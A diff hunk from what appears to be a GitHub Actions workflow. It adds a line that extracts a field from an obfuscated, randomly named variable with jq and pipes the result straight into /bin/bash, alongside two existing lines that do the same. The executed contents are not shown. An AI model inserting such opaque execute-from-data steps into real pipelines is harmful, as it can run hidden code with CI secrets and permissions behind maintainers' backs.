@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$l8" | jq -r .v75 | /bin/bash
           echo $n02 | jq -r .ue71929 | /bin/bash
+          printf '%s' "$hlmg9080" | jq -r .f9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
